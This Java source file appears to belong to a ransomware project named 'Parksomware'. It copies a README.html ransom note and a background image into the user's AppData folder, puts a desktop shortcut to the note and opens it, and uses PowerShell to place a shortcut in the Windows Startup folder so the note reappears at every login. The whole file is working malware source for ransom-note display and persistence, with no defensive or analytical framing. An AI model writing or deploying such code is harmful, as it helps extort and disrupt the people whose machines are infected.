package kr.pah;

import java.awt.*;
import java.io.*;
import java.nio.file.*;

public class CreateReadme {

    private static final String PARKSOMWARE_DIR = System.getenv("APPDATA") + "\\Parksomware";

    public static void main() {
        try {
            Path parksomwarePath = Paths.get(PARKSOMWARE_DIR);
            if (!Files.exists(parksomwarePath)) {
                Files.createDirectories(parksomwarePath);
            }

            Path readmePath = extractFileToAppData("/README.html");
            Path backgroundPath = extractFileToAppData("/background.png");
            Path desktopShortcut = addToDesktopShortcut(readmePath);
            addToStartup(readmePath);
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    private static Path extractFileToAppData(String resourceFileName) throws IOException {
        Path filePath = Paths.get(PARKSOMWARE_DIR, resourceFileName.substring(1)); // Remove the leading "/"
        try (InputStream is = CreateReadme.class.getResourceAsStream(resourceFileName)) {
            if (is == null) {
                throw new FileNotFoundException(resourceFileName + " not found in Jar file.");
            }
            Files.copy(is, filePath, StandardCopyOption.REPLACE_EXISTING);
        }
        return filePath;
    }

    private static Path addToDesktopShortcut(Path filePath) throws IOException, InterruptedException {
        Path desktopPath = Paths.get(System.getenv("USERPROFILE"), "Desktop");
        Path shortcutPath = desktopPath.resolve(filePath.getFileName().toString() + ".lnk");

        String script = "powershell \"$s = (New-Object -COM WScript.Shell).CreateShortcut('" + shortcutPath + "'); "
                + "$s.TargetPath = '" + filePath + "'; $s.Save()\"";
        Runtime.getRuntime().exec(script);

        int attempts = 0;
        while (!Files.exists(shortcutPath) && attempts < 10) {
            Thread.sleep(500);
            attempts++;
        }

        // 파일이 존재하면 실행
        if (Files.exists(shortcutPath)) {
            if (Desktop.isDesktopSupported() && Desktop.getDesktop().isSupported(Desktop.Action.OPEN)) {
                Desktop.getDesktop().open(shortcutPath.toFile());
            }
        } else {
            System.out.println("바로가기 생성 실패: " + shortcutPath);
        }

        return shortcutPath;
    }

    private static void addToStartup(Path filePath) throws IOException {
        String startupFolderPath = System.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
        Path shortcutPath = Paths.get(startupFolderPath, filePath.getFileName().toString() + ".lnk");

        String script = "powershell \"$s = (New-Object -COM WScript.Shell).CreateShortcut('" + shortcutPath.toString() + "'); "
                + "$s.TargetPath = '" + filePath.toString() + "'; $s.Save()\"";

        Runtime.getRuntime().exec(script);
    }
}
